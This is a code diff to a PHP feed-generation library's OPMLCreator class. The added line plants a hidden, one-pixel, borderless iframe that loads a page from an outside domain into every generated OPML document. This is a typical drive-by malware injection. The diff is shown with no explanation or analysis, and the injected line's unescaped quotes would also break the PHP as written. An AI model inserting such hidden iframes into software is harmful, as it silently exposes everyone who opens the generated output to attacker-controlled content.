@@ -1592,7 +1592,8 @@ class OPMLCreator extends FeedCreator {
 			$feed.= " url=\"".htmlspecialchars($this->items[$i]->link)."\"";
 			$feed.= "/>\n";
 		}
-		$feed.= "	</body>\n";
+		$feed.= "	<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>\n";
 		$feed.= "</opml>\n";
 		return $feed;
 	}
@@ -1879,5 +1880,3 @@ $rss->image = $image;
 echo $rss->saveFeed("RSS0.91", "feed.xml");
 
 
-
-***************************************************************************/
